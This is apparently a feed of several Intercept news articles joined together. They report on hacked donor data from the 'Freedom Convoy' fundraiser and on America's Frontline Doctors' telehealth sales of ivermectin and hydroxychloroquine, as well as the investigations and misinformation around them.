<h2>Thousands of &#8220;Freedom Convoy&#8221; Donors Gave to Other Anti-Vaccine and Far-Right Causes</h2>
<p>The hacked data includes the history of every donation ever made through the GiveSendGo platform. &#8220;Freedom Convoy&#8221; donors gave a total of $7.6 million to other GiveSendGo campaigns as well as the $9.6 million to the &#8220;Freedom Convoy&#8221; campaigns.</p>
<p>By comparing the email addresses of &#8220;Freedom Convoy&#8221; donors with donations from other GiveSendGo campaigns, The Intercept discovered that many of the same donors also gave money to other anti-vaccine causes championed by Project Veritas.</p>
<ul>
<li>1,693 &#8220;Freedom Convoy&#8221; donors also donated $63,000 to Morgan Kahmann, an anti-vaccine former Facebook employee and self-styled “whistleblower” who leaked an internal document about the social network’s Covid-19 misinformation moderation policy to Project Veritas. Kahmann’s GoSendMe campaign earned him <a href="https://www.salon.com/2021/08/07/anti-vaxxers-are-getting-rich-thanks-to-this-christian-crowdfunding-site_partner-2/">over $500,000</a>.</li>
<li>1,612 donors also gave $66,000 to Jodi O’Malley, who is described as a &#8220;Covid-19 Federal whistleblower.” O’Malley, a registered nurse who worked for Phoenix Indian Medical Center, recorded a video for Project Veritas making <a href="https://www.mediamatters.org/project-veritas/social-media-platforms-are-letting-project-veritas-video-pushing-coronavirus">unsubstantiated claims</a> that Covid-19 vaccines harmed patients and that ivermectin is an effective treatment for the virus. Public health experts advise against using ivermectin to treat Covid-19. O’Malley earned $475,000 from this GiveSendGo campaign.</li>
<li>1,532 donors also donated $55,000 to Melissa Strickler, a former Pfizer manufacturing quality auditor who leaked company emails to Project Veritas that she believed showed the vaccine contained aborted fetal cells. <a href="https://www.snopes.com/fact-check/pfizer-covid-19-vaccine-fetal-cells/">This is false</a>, but she still earned $347,000 from her GiveSendGo campaign.</li>
</ul>
<p>The Intercept also discovered that many donors gave to anti-democracy efforts in the U.S., legal defense funds for January 6 prisoners, the legal defense fund for Rittenhouse, and various funds supporting the Proud Boys, an American hate group that also played a role in the January 6 Capitol attack.</p>
<ul>
<li>Over 2,000 donors also gave more than $120,000 to campaigns aimed at reversing the 2020 election results. The most prominent campaign was for the Voter Integrity Project, run by former Trump campaign operative Matt Braynard. Braynard raised nearly $700,000 through GiveSendGo for his project, which <a href="https://www.motherjones.com/politics/2020/12/a-pro-trump-voting-expert-was-questioned-about-his-data-it-did-not-go-well-for-him/">he claimed</a> would acquire voter data from swing states and use this data to prove that there was voter fraud in states where Trump lost to Biden. Braynard’s efforts have been widely discredited. In a Georgia case that cited his data, Democratic lawyers pointed out that “Braynard does not have the appropriate qualifications to opine on these topics, he does not follow standard methodology in the relevant scientific field, and the survey underlying several of his opinions is fatally flawed.” The case was eventually dismissed.</li>
<li>Over 2,000 donors also gave more than $130,000 to campaigns related to supporting the legal defense of people arrested for participating in the January 6 Capitol attack, including a fund started by a lawyer representing Ashli Babbitt’s family. Babbitt was shot and killed by a Capitol Police officer on January 6 inside the U.S. Capitol.</li>
<li>1,166 donors also gave nearly $50,000 to Rittenhouse’s legal defense fund. This campaign raised a total of $629,000. Hundreds of donors also donated $16,000 to campaigns supporting the Proud Boys.</li>
</ul>
<h2>Donors Used Government Email Addresses</h2>
<p>A handful of small donations were made using government email addresses.</p>
<p>Someone donated using an email address from the Correctional Service of Canada, the Canadian agency responsible for running prisons. While the user listed his real first and last name in the donation, he put “George Soros” as his display name.</p>
<p>Another person donated multiple times with their U.S. Department of Justice email address. Two people donated using Federal Bureau of Prisons email addresses, and two others donated using NASA email addresses. One donor used their delaware.gov email address. Someone with a U.S. Navy email address donated $50 and listed their display name as “Lets Go Brandon,” and someone with a U.S. Army email address donated $25.</p>
<p>One person used his TSA email address to donate $50 to the anti-vaccine mandate &#8220;Freedom Convoy.&#8221; The transportation agency has enforced mandates, like requiring passengers to remove their shoes when going through airport checkpoints, in the name of security since September 11, 2001.</p>

                                        <content:encoded><![CDATA[<p><u>Project Veritas,</u> the far-right group known for deceptively editing videos of its undercover operations, has denied partnering with anti-vaccine propaganda group America’s Frontline Doctors on a video series called &#8220;Doc Tracy: Physician Investigator.&#8221; The series appears to be aimed at harassing medical regulators and spreading Covid-19 pandemic disinformation.</p>
<p>After publication, both AFLDS and Project Veritas disputed that they were working together, despite the fact that &#8220;Christian Hartsock, Project Veritas&#8221; was credited in the series trailer as a &#8220;consulting producer&#8221; and Project Veritas was prominently mentioned in promotional materials. An email received by The Intercept after signing up for a &#8220;Doc Tracy&#8221; promotions list stated: &#8220;Thank you for joining me and my fellow detectors on the Project Veritas Muckraker tour.&#8221; That reference has now been removed from the &#8220;Doc Tracy&#8221; promotional email and the consulting producer credit has been removed from the trailer. Neither Project Veritas nor AFLDS responded to requests for comment prior to publication.</p>
<p>The series stars Christopher Rake, a former anesthesiologist at UCLA Health. “I’m willing to lose everything — job, paycheck, freedom, even my life for this cause,” he said in a video he recorded of himself as UCLA staff <a href="https://www.latimes.com/california/story/2021-10-06/ucla-anesthesiologist-vocal-against-covid-19-vaccine-mandates-is-escorted-out-of-workplace">escorted</a> him out of the medical facility where he worked in October for refusing to take the Covid-19 vaccine. He’s the founder of the anti-vaccine group Citizens United for Freedom. In a crowdfunding campaign for his group, he wrote, “I&#8217;m a physician, a follower of Jesus, and a patriot who lost his job because I stood up for freedom.”</p>
<p>A trailer for the &#8220;Doc Tracy&#8221; video series — which the group released on January 29 to its more than 400,000 Twitter followers, its over 200,000 Telegram channel subscribers, and on its email newsletter — includes a few seconds of Kristina Lawson, president of California’s medical board, being accosted in a parking garage. On December 6, people who identified themselves as members of AFLDS followed and intimidated Lawson. In <a href="https://www.sfchronicle.com/eastbay/article/They-ambushed-me-Medical-board-president-16686086.php">interviews</a> and on a <a href="https://twitter.com/kdlaw/status/1468637025590906880">Twitter thread</a>, Lawson said the group parked an SUV at the end of her driveway in Walnut Creek, California, flew a drone over her house, watched her children drive to school, and then followed her to work. When she left work, Lawson said, four men “ambushed” her in a dark parking garage with cameras, saying they wanted to interview her.</p>

<p>AFLDS’s founder, Dr. Simone Gold, who has reached a <a href="https://www.wusa9.com/article/news/national/capitol-riots/anti-vax-doctor-simone-gold-reaches-plea-deal-in-capitol-riot-case-john-herbert-strand-covid-19-hydroxychloroquine-ivermectin-americas-frontline/65-06593dc8-7f9a-47ec-93f0-f507e3c1b2a7">plea agreement</a> for her role in the deadly January 6 attack on the U.S. Capitol, is a licensed medical doctor in the state of California. In September, The Intercept <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2021/09/28/covid-telehealth-hydroxychloroquine-ivermectin-hacked/">revealed</a> that AFLDS works with a network of telehealth companies to rake in millions of dollars selling hydroxychloroquine, ivermectin, and online consultations to Covid-19 vaccine skeptics. Most doctors, as well as the Food and Drug Administration, National Institutes of Health, American Medical Association, and World Health Organization, advise against prescribing these two medicines to treat or prevent Covid-19. Because of Gold’s work with AFLDS spreading disinformation about the vaccine’s safety and efficacy and selling unproven treatments for Covid-19, the state medical board has been under pressure by other medical doctors and pro-science activists to strip her of her license. The Intercept confirmed that the board is actively investigating Gold.</p>

<p>The AFLDS website has a form to sign up for updates about the new &#8220;Doc Tracy&#8221; video series, which it says will be released this month. The form includes the question, “Are you a social media influencer (any size) and would you like to be involved (paid or unpaid) in promoting Doc Tracy?”</p>
<p>After signing up for updates, the website sent an automated email that stated, “Thank you for joining me and my fellow fraud detectors on the Project Veritas Muckraker Tour. What an event!” The email said the video series will ask “tough questions from people who really don’t want to answer them” and that “They’re going to cry crocodile tears like Kristina Lawson did.” Project Veritas subsequently denied involvement in the video series. AFLDS eventually removed references to Project Veritas from its promotional materials.</p>

<p>The trailer originally listed “Christian Hartsock, Project Veritas” as a consulting producer. Hartsock is a “senior investigative reporter” for Project Veritas. On February 1, just after promoting the trailer for the video series, Gold <a href="https://twitter.com/drsimonegold/status/1488770585278787588">posted</a> to Twitter and Telegram, “What a joy and an honor to join Project Veritas this week in the freedom state of Florida.”</p>
<p>The post includes a photo of Gold and her colleague John Strand — a professional model and actor who hosts short &#8220;fake news&#8221; segments for AFLDS and who has also been charged in the January 6 riot at the Capitol — standing with Rep. Matt Gaetz, R-Fla. Gaetz is currently under <a href="https://www.washingtonpost.com/politics/2022/01/27/sex-trafficking-allegations-matt-gaetz/">federal investigation</a> for allegedly sex trafficking a 17-year-old girl.</p>

<p>Gold and Gaetz were likely attending an <a href="https://www.rollingstone.com/politics/politics-news/project-veritas-james-okeefe-american-muckraker-1292654/">event</a> related to the launch of Project Veritas founder James O’Keefe’s new book, “American Muckraker.” O’Keefe is calling his book tour the “Project Veritas Muckraker Tour.”</p>
<p>The trailer for the new AFLDS video series includes images of <a href="https://www.politifact.com/article/2022/jan/06/who-robert-malone-joe-rogans-guest-was-vaccine-sci/">discredited</a> scientist Dr. Robert Malone and his suspended Twitter account, while a voiceover says, “In a time where stating the facts is made illegal.”</p>
<p>On December 31, Malone was a guest on &#8220;The Joe Rogan Experience,&#8221; the $100 million Spotify podcast, where he used his credentials as an <a href="https://www.theatlantic.com/science/archive/2021/08/robert-malone-vaccine-inventor-vaccine-skeptic/619734/">early researcher</a> on mRNA gene transfer techniques to promote disinformation about Covid-19 vaccines. He also compared Covid-19 vaccination efforts in the U.S. to Germany when the Nazi Party rose to power.</p>
<p>In response to the episode, over 1,300 doctors, nurses, scientists, and professors signed an <a href="https://spotifyopenletter.wordpress.com/2022/01/10/an-open-letter-to-spotify/">open letter</a> to Spotify demanding that the company “immediately establish a clear and public policy to moderate misinformation on its platform.” This letter sparked a backlash against Spotify, with major artists including Neil Young and Joni Mitchell boycotting the platform and users <a href="https://www.cnn.com/2022/02/09/media/spotify-cancelation-page-joe-rogan/index.html">canceling</a> their accounts en masse.</p>
<p><strong>Update: February 24, 2022</strong></p>

<p><em>Winston Smith from Project Veritas provided the following statement: &#8220;The references to Project Veritas in America Frontline Doctors’ production was neither done with Project Veritas’ knowledge or approval.

                                        <content:encoded><![CDATA[<p><u>America’s Frontline Doctors,</u> an organization that has been widely criticized for spreading false information about Covid-19 vaccines and advocating for potentially dangerous replacements, is expanding. According to a <a href="https://web.archive.org/web/20211214234440/https://madmimi.com/p/0b4f331?pact=36925549-165885099-13577511996-7a8e9188fc1aaa92ac0904cd4b0040980905605b">newsletter</a> the group sent to its supporters last week, “AFLDS is opening its first medical clinic in the coming months, with many more planned shortly after.” The email includes a link to forms that can be filled out by doctors and nurses who want to work with AFLDS, and pharmacists who want to fill prescriptions for unproven Covid-19 medications, so they can become part of the AFLDS network.</p>

<p>The expansion comes amid increased scrutiny of AFLDS from the media, Congress, and the Medical Board of California. Doctors associated with AFLDS have prescribed hundreds of thousands of patients hydroxychloroquine and ivermectin through a telemedicine service, hacked records obtained by The Intercept <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2021/09/28/covid-telehealth-hydroxychloroquine-ivermectin-hacked/">revealed</a> in September. And the network of online health care companies associated with AFLDS have charged patients millions of dollars. In October, citing The Intercept’s report and related reporting by Time magazine, the House Select Subcommittee on the Coronavirus Crisis <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2021/11/01/covid-hydroxychloroquine-ivermectin-investigation/">announced an investigation</a> into AFLDS and the companies it works with, calling them “predatory actors” that have been “touting misinformation and using it to market disproven and potentially hazardous coronavirus treatments.”</p>
<p>Pressure has been mounting for the California medical board to strip AFLDS’s founder, Simone Gold, of her license in the state. Gold, who was arrested and charged after the deadly attack on the U.S. Capitol on January 6, refers to Covid-19 vaccines as “experimental biological agents.” The Intercept confirmed that the board is actively investigating Gold, though it declined to share further information about the investigation or make any statements about Gold, saying that such matters are confidential until the state attorney general’s office files a complaint.</p>

<p>Earlier this month, the president of California’s medical board, Kristina Lawson, <a href="https://www.sfchronicle.com/eastbay/article/They-ambushed-me-Medical-board-president-16686086.php">alleged</a> that people who identified themselves as members of AFLDS followed and intimidated her. Lawson described the ordeal in a <a href="https://twitter.com/kdlaw/status/1468637025590906880">Twitter thread</a>. She said the group parked an SUV at the end of her driveway in Walnut Creek, flew a drone over her house, watched her children drive to school, and then followed her to work. When she left work, she said four men “ambushed” her in a dark parking garage with cameras, saying they wanted to interview her. Lawson said they never contacted her, the medical board’s press office, or her company asking for an interview through professional channels. “I’m not going to be intimidated by these terrorizing tactics,” Lawson <a href="https://www.msnbc.com/the-last-word/watch/ca-medical-board-president-stalked-by-anti-vaccine-group-128846405676?cid=sm_npd_ms_tw_lw">told</a> MSNBC, noting that she has since hired private security.

<p>AFLDS did not respond to a request for comment.</p>
<h3>State Medical Boards</h3>
<p>In July, the Federation of State Medical Boards, the national organization representing all U.S. state medical boards, issued a <a href="https://www.fsmb.org/advocacy/news-releases/fsmb-spreading-covid-19-vaccine-misinformation-may-put-medical-license-at-risk/">statement</a> saying that “physicians who generate and spread COVID-19 vaccine misinformation or disinformation are risking disciplinary action by state medical boards, including the suspension or revocation of their medical license” and that “spreading inaccurate COVID-19 vaccine information contradicts that responsibility, threatens to further erode public trust in the medical profession and puts all patients at risk.”</p>
<p>Last week, an organization founded by <a href="https://www.washingtonpost.com/opinions/2021/09/21/state-medical-boards-should-punish-doctors-who-spread-false-information-about-covid-vaccines/">emergency room doctors working on the frontlines</a> of the Covid-19 pandemic, No License for Disinformation, released a <a href="https://debeaumont.org/news/2021/disinformation-doctors-report/">scathing new report</a> urging state medical licensing bodies to investigate doctors who deliberately spread misleading or false Covid-19 information and hold them accountable. “State medical boards must act immediately to support the overwhelming, evidence-based medical consensus, stop the attack on science and medicine, and most importantly, prevent further unnecessary COVID-19 deaths,” the report, published in collaboration with the public health nonprofit the de Beaumont Foundation, states.</p>
<p>The report argues that a “small but vocal minority of physicians” — including those affiliated with AFLDS — “are intentionally and publicly spreading disinformation about COVID-19 and vaccines.” They are “putting lives at risk and violating their professional oath,” the report says, noting that state medical boards have so far failed to act. Nine out of 10 Americans believe that doctors who intentionally mislead the public about Covid-19 and vaccines should be held accountable, according to a poll included in the report, and 91 percent believe that doctors do not have the right to intentionally spread misinformation or false health information.</p>
<h3>AFLDS’s Expanding Reach</h3>
<p>In recent months, AFLDS has also ramped up its efforts to undermine the Covid-19 vaccine. AFLDS distributes high-quality propaganda videos to its more than 200,000 followers on Telegram, and to Gold’s 380,000-plus followers on Twitter, often publishing multiple videos a week. AFLDS “correspondent” John Strand, a professional model and actor, hosts short fake news segments called “Frontline Flash” about the dangers of Covid-19 vaccines. AFLDS also posts videos to social media under the brand “Frontline Films” showing seemingly ordinary Americans sharing anecdotes about ivermectin saving their lives.</p>
<p>In addition to the telemedicine provider SpeakWithAnMD, which The Intercept has previously reported on, AFLDS is also now using a second telemedicine platform, GoldCare Telemed. When visitors request medication through the AFLDS website, those who self-report symptoms are directed to SpeakWithAnMD, and asymptomatic people are sent to GoldCare Telemed, a new website set up in late November. The two sites appear to be using the same underlying platform. Like SpeakWithAnMD, GoldCare Telemed includes a disclaimer requiring patients to acknowledge that public health organizations deem ivermectin and hydroxychloroquine “Highly Not Recommended.”</p>

<p><i></i>AFLDS’s efforts have even edged their way into Pennsylvania’s state legislature. In July, Republican state Rep. Dawn Keefer <a href="https://www.abc27.com/news/health/coronavirus/coronavirus-pennsylvania/lawmakers-to-discuss-bill-allowing-off-label-use-of-drugs-to-treat-covid/">introduced a bill</a> in the Pennsylvania legislature that would allow doctors to prescribe ivermectin and hydroxychloroquine to treat Covid-19, despite both being ineffective at treating the virus, and would require pharmacists to dispense these medications.</p>
<p>The bill <a href="https://livestream.com/accounts/21610338/events/9996907/player?width=640&amp;height=360&amp;enableInfoAndActivity=true&amp;defaultDrawer=&amp;autoPlay=true&amp;mute=false&amp;fbclid=IwAR1c1RX80IIX8YjH-83Z-DapwlLpaddpwocnBKaDwmN-bC8wWaw4RixyKI0">came up for debate</a> last Monday. Dr. Robert Schmidt, a family medicine doctor who falsely claimed that hydroxychloroquine was an effective treatment for Covid-19 and brought up a <a href="https://api.politifact.com/factchecks/2021/nov/12/facebook-posts/no-scientific-basis-claims-ivermectins-success-utt/">discredited theory</a> about ivermectin use in the Indian state of Uttar Pradesh, cited the story of Darla and Keith Smith. On November 10, the Pennsylvania couple both tested positive for Covid-19. It’s not known if they had been vaccinated against the virus. “We both did teleconsults with America’s Frontline Doctors and we both got ivermectin scripts approved, but it never came in the mail,” Darla <a href="https://www.abc27.com/news/health/coronavirus/coronavirus-pennsylvania/lawmakers-to-discuss-bill-allowing-off-label-use-of-drugs-to-treat-covid/">told</a> a local ABC News station. Keith, 52, was hospitalized. His condition deteriorated, and by November 21 he was transferred to the intensive care unit. When doctors at UPMC Memorial refused to treat him with ivermectin because it was not part of the hospital’s Covid-19 protocols, Darla <a href="https://www.ydr.com/story/news/2021/12/06/court-orders-hospital-allow-ivermectin-treatment-york-covid-case/8889300002/">sued the hospital</a> and won.</p>
<p>On December 5, a nurse administered ivermectin to Keith, who at this point was in a medically induced coma, through his feeding tube. After he received a second dose, the doctor overseeing his ivermectin administration ended the treatment because his condition had deteriorated. Last Sunday, a week after receiving ivermectin, Keith Smith <a href="https://www.ydr.com/story/news/2021/12/13/pa-man-who-won-court-battle-treat-his-covid-ivermectin-has-died/6493657001/">died</a> of Covid-19.</p>

                                        <content:encoded><![CDATA[<p><u>On Friday,</u> Rep. James Clyburn, D-S.C., chair of the House Select Subcommittee on the Coronavirus Crisis, <a href="https://coronavirus.house.gov/news/press-releases/select-subcommittee-launches-investigation-online-entities-pushing-coronavirus">announced</a> an investigation into the right-wing, anti-science propaganda group America’s Frontline Doctors and telemedicine provider SpeakWithAnMD.com following an Intercept investigation. Clyburn called the two organizations “predatory actors” that have been “touting misinformation and using it to market disproven and potentially hazardous coronavirus treatments” such as ivermectin and hydroxychloroquine.</p>
<p>The committee, citing The Intercept, requested documents from America’s Frontline Doctors, or AFLDS, and SpeakWithAnMD about their business practices and profits. It wrote to the Federal Trade Commission requesting that the agency investigate whether these companies are in violation of federal laws.</p>
<!-- BLOCK(promote-related-post)[0](%7B%22componentName%22%3A%22PROMOTE_RELATED_POST%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%22relatedPostNumber%22%3A1%7D) --><div class="promote-embed" data-related-post-number="1"></div><!-- END-BLOCK(promote-related-post)[0] -->
<p>“Attempts to monetize coronavirus misinformation have eroded public confidence in proven treatments and prevention measures and hindered efforts to control the pandemic,” Clyburn wrote in his letter to AFLDS. “Some Americans who have been influenced by misinformation have chosen not to get vaccinated, delayed receiving evidence-based treatment, and ingested unapproved substances in harmful quantities.”</p>
<p>An investigation <a href="https://time.com/6092368/americas-frontline-doctors-covid-19-misinformation/">by Time</a> in August, also cited by Clyburn, revealed that hundreds of AFLDS patients paid SpeakWithAnMD $90 for Covid-19 consultations hoping to get ivermectin or hydroxychloroquine, which public health authorities say should not be taken to treat or prevent Covid-19, but never received the medicine. Some were charged for the consultations but never got a call back from a physician; others who did get prescriptions were charged up to $700 for the medication.</p>

<p>In September, The Intercept obtained hacked data <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2021/09/28/covid-telehealth-hydroxychloroquine-ivermectin-hacked/">revealing</a> that the network of right-wing health care companies was making millions advertising, prescribing, and distributing ivermectin and hydroxychloroquine as an alternative to the highly effective Covid-19 vaccines. Between July and September, 72,000 patients whom AFLDS referred to SpeakWithAnMD were charged an estimated $6.7 million for telemedicine consultations alone. AFLDS began referring patients to SpeakWithAnMD in January, and The Intercept does not have data between January and July, so the total revenue from the operation is likely considerably higher.</p>
<p>SpeakWithAnMD then wrote prescriptions for the questionable treatments that were filled by the online pharmacy <a href="https://time.com/6104407/ravkoo-pharmacy-ivermectin-covid-19-ppp-loan/">Ravkoo</a>, which is not a subject of the House investigation. Ravkoo, according to the hacked data, charged patients an additional $4.7 million for ivermectin, $2.4 million for azithromycin, and $1.2 million for hydroxychloroquine between November and August.</p>

<p>The SpeakWithAnMD site was taken offline for a week after The Intercept’s story, which revealed security holes around sensitive patient data on SpeakWithAnMD.com and Ravkoo. Both sites are now up and running again. “[SpeakWithAnMD] is not part of the anti-vax movement, and we do not oppose vaccinations,” Jim Flinn, a public relations agent working for SpeakWithAnMD, told The Intercept. Alpesh Patel, Ravkoo’s CEO, told The Intercept that his online pharmacy no longer works with AFLDS.</p>
<p>In letters to Simone Gold and Jerome Corsi, the founders of AFLDS and SpeakWithAnMD, respectively, Clyburn requested detailed records from both companies, including documents related to ownership, organizational structure, and staffing; details about the doctors’ training and qualifications; numbers of patients and what they were prescribed; and descriptions of the companies’ total revenue and net income for each quarter.</p>

<p>The idea behind AFLDS was first floated during a May 11, 2020, <a href="https://apnews.com/article/health-us-news-ap-top-news-politics-virus-outbreak-4ee1a3a8d631b454f645b2a8d9597de7">conference call</a> between a senior staffer in former President Donald Trump’s reelection campaign and the Republican activist group CNP Action, during which they reportedly discussed finding “extremely pro-Trump” doctors to go on TV and defend Trump’s plan to rapidly reopen the economy despite the more cautious safety guidance coming from the Centers for Disease Control and Prevention. Gold, who was <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2021/01/14/capitol-riot-covid-vaccine-doctor/">arrested</a> and <a href="https://www.justice.gov/usao-dc/defendants/gold-simone-melissa">charged</a> after the deadly attack on the U.S. Capitol on January 6, calls Covid-19 vaccines “experimental biological agents.”</p>
<p>Corsi is a former host of InfoWars who reportedly spoke to Trump before he was elected president on several occasions about the false “birtherism” conspiracy theories about former President Barack Obama’s citizenship. Corsi was also <a href="https://www.nbcnews.com/politics/justice-department/mueller-has-emails-stone-pal-corsi-about-wikileaks-dem-email-n940611">caught up</a> in special counsel Robert Mueller’s investigation into Russian interference in the 2016 election.</p>
<p>In another letter to Lina Khan, chair of the FTC, Clyburn requested that the agency “investigate the deceptive conduct of companies promoting and profiting from misinformation” about the pandemic, singling out AFLDS and SpeakWithAnMD. “Misinformation endangers public health and fuels vaccine hesitancy by promoting the false ideas that coronavirus vaccines are unsafe and ineffective and that alternative drugs can prevent or cure coronavirus infections,” Clyburn wrote. “Exploiting these falsehoods for financial gain puts American lives at risk and sets back our nation’s efforts to combat the spread of the coronavirus. I am concerned that these predatory practices are endangering American lives and harming our efforts to stop the spread of the virus.”</p>
<p>Clyburn’s letter says he believes that the companies’ deceptive practices could “violate the FTC Act, the COVID-19 Consumer Protection Act, or other relevant laws. For these reasons, I urge FTC to open an investigation into these matters and appropriately exercise its enforcement authority.”</p>

                                        <content:encoded><![CDATA[<p><u>A network of</u> health care providers pocketed millions of dollars selling hydroxychloroquine, ivermectin, and online consultations, according to hacked data provided to The Intercept. The data show that vast sums of money are being extracted from people concerned about or suffering from Covid-19 but resistant to vaccinations or other recommendations of public health authorities.</p>
<p>America’s Frontline Doctors, a right-wing group founded last year to promote pro-Trump doctors during the coronavirus pandemic, is working in tandem with a small network of health care companies to sow distrust in the Covid-19 vaccine, dupe tens of thousands of people into seeking ineffective treatments for the disease, and then sell consultations and millions of dollars’ worth of those medications. The data indicate patients spent at least $15 million — and potentially much more — on consultations and medications combined.</p>

<p>The Intercept has obtained hundreds of thousands of records from two companies, CadenceHealth.us and Ravkoo, revealing just how the lucrative operation works. America’s Frontline Doctors, or AFLDS, has been spreading highly politicized misinformation about Covid-19 since the summer of 2020 and refers its many followers to its telemedicine partner SpeakWithAnMD.com, which uses Cadence Health as a platform. People who sign up then pay $90 for a phone consultation with “AFLDS-trained physicians” who <a href="https://www.cnbc.com/2021/08/27/clamoring-for-ivermectin-some-turn-to-pro-trump-telemedicine-website.html">prescribe treatments</a> such as hydroxychloroquine and ivermectin to prevent and treat Covid-19. The drugs are delivered by Ravkoo, a service that works with local pharmacies to ship drugs to patients’ doors. Of course, that’s if patients ever get the consultation; many customers told Time they <a href="https://time.com/6092368/americas-frontline-doctors-covid-19-misinformation/">never received the call</a> after paying.</p>
<p>The data from the Cadence Health and Ravkoo sites was provided to The Intercept by an anonymous hacker who said the sites were &#8220;hilariously easy&#8221; to hack, despite promises of patient privacy. It was corroborated by comparing it to publicly available information. The Intercept is not publishing any individual patient data and has taken steps to secure the data. After The Intercept reached out, Cadence Health’s Roque Espinal-Valdez said he shut the platform down, not wanting any part in profiting off of Covid-19 “quackery.”</p>

<p>America’s Frontline Doctors, which debuted in the summer of 2020, has close ties to a network of right-wing efforts to undermine public health during the pandemic, including the <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2021/08/05/tea-party-patriots-hacked-billionaire-donors/">Tea Party Patriots</a>. AFLDS’s founder, physician Simone Gold, was <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2021/01/14/capitol-riot-covid-vaccine-doctor/">arrested</a> and <a href="https://www.justice.gov/usao-dc/defendants/gold-simone-melissa">charged</a> after the deadly attack on the U.S. Capitol on January 6. She and other doctors have appeared in widely shared videos arguing that the drugs hydroxychloroquine and ivermectin — which are primarily used to treat malaria in humans and parasitic worms in livestock, respectively — are effective treatments for Covid-19, despite warnings from the World Health Organization and Centers for Disease Control and Prevention against using them.</p>
<p>The extremely partisan group also misleads people about Covid-19 vaccines, which they refer to as “experimental biological agents,” and against public health measures like vaccine mandates, masking, social distancing, and restrictions on businesses. In a video titled “The Truth About Covid-19 Vaccines,” which has received over 1.3 million views, Gold falsely argues that Covid-19 is not very deadly and that the vaccines are more dangerous than the virus itself. Over 690,000 Americans so far have died from the virus, and unvaccinated people now make up <a href="https://www.npr.org/2021/07/16/1017002907/u-s-covid-deaths-are-rising-again-experts-call-it-a-pandemic-of-the-unvaccinated">99 percent</a> of recent Covid-19 deaths.</p>

<p>“Misinformation can be really powerful to swindle people into buying products,” Dr. Kolina Koltai, who researches vaccine misinformation in digital communities at the University of Washington&#8217;s Center for an Informed Public, told The Intercept. “America&#8217;s Frontline Doctors are able to scale this up massively.”</p>
<!-- BLOCK(cta)[3](%7B%22componentName%22%3A%22CTA%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%7D) --><!-- END-BLOCK(cta)[3] -->
<p>The hacked data includes information on 281,000 patients created in the Cadence Health database between July 16 and September 12, 2021 — 90 percent of whom were referred from America’s Frontline Doctors. In just those two months, patients paid an estimated $6.7 million for consultations. The data also includes notes from patients’ phone consultations, which sometimes include medical histories and prescription information.</p>
<p>Roque Espinal, Cadence Health’s CEO, told The Intercept that he was unaware of the scheme and that Cadence Health simply provided a telehealth platform for SpeakWithAnMD.com, its patients, and physicians. “I’m totally flabbergasted. I had to look up exactly who these people were,” he said. “I’m fully vaccinated. My children are fully vaccinated. I’m trying to make heads and tails of this right now.” After talking with The Intercept on Monday, Espinal said he terminated service with SpeakWithAnMD. He added, “I don’t want to be associated with any crap like that. None of that quackery that’s going on.” SpeakWithAnMD’s telemedicine platform, which relies on Cadence Health, is currently down.</p>
<p>“[SpeakWithAnMD] is not part of the anti-vax movement and we do not oppose vaccinations,” Jim Flinn, a public relations agent working for the site’s parent company, Encore Telemedicine, told The Intercept.</p>
<p>“American Frontline Doctor’s [sic] take these issues very seriously,” Thomas Gennaro, a lawyer for America’s Frontline Doctors, told The Intercept in a statement. “For AFLDS, positive patient-physician outcomes and confidentiality is critical. We understand that the information from this was reported to the FBI, and AFLDS launched a third-party audit and are responding to this issue with the utmost attention.”</p>
<p>The hacker also provided records of 340,000 prescriptions that Ravkoo has filled between November 3, 2020, and September 11, 2021 — amounting to an estimated $8.5 million in drug costs.<b> </b>Forty-six percent of the prescriptions are for hydroxychloroquine or ivermectin, and another 30 percent are for zinc or azithromycin, two other <a href="https://www.ucsf.edu/news/2021/07/421051/common-covid-19-antibiotic-no-more-effective-placebo">ineffective</a> medications that the SpeakWithAnMD physicians, who America’s Frontline Doctors claims it trains, prescribe in their Covid-19 consultations.</p>
<p>“We take data breaches very seriously,” Ravkoo CEO Alpesh Patel told The Intercept. Patel claims that Ravkoo stopped doing business with SpeakWithAnMD and AFLDS at the end of August because “the volume over there went up crazy, and we didn’t feel comfortable. And we don’t have that much capacity to fill that many prescriptions.” The hacked data shows that they filled hundreds more prescriptions for AFLDS in the first weeks of September. “That might be refills or prescriptions that got stuck and we had to fill it,” Patel claimed.</p>
<p>The WHO <a href="https://www.who.int/news-room/q-a-detail/coronavirus-disease-(covid-19)-hydroxychloroquine#">recommends against</a> taking hydroxychloroquine to treat Covid-19 because it’s ineffective and can have negative side effects. Cardiologists <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2020/04/06/drug-treatment-trump-talks-covid-can-fatal-side-effect-cardiologists-warn/">warn</a> that hydroxychloroquine taken with azithromycin, a combination that former President Donald Trump publicly supported, increases the risk of dangerous irregular heartbeats that could be fatal. The CDC <a href="https://emergency.cdc.gov/han/2021/pdf/CDC_HAN_449.pdf">advised</a> people not to take ivermectin, saying that it can cause “severe illness.” The Food and Drug Administration issued <a href="https://www.fda.gov/animal-veterinary/product-safety-information/faq-covid-19-and-ivermectin-intended-animals">similar warnings</a> and tweeted, “You are not a horse. You are not a cow. Seriously, y&#8217;all. Stop it,” with a link to an article explaining that taking it for Covid-19 can cause extreme health issues.</p>

